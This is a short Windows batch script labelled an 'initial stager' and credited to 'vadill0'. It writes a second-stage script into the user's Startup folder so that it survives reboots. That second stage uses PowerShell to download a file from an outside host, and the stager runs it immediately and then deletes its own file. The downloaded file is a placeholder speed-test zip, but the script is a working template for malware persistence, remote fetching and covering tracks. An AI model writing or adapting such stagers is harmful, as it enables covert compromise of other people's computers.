@echo off
@REM initial stager
@REM author vadill0

@REM variables
set "VAR=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM cd STARTUP directory
cd "%STARTUP%"

@REM write payloads
( 
    @echo off
    echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'test.zip'"
) > stage2.cmd

@REM run payload
powershell ./stage2.cmd

@REM cd back to original directory
cd "%VAR%"
del initial.cmd